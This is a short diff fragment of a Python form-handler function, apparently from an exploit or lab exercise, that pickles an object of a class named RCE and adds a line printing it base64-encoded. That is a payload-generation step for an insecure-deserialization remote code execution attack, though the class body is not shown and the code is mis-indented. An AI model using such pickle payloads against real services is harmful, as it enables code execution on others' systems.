@@ -21,7 +21,7 @@ def my_form_post():
     try:
         
     pickled = pickle.dumps(RCE())
-    
+    print(base64.urlsafe_b64encode(pickled))
     
     except Exception as e:
         output = e
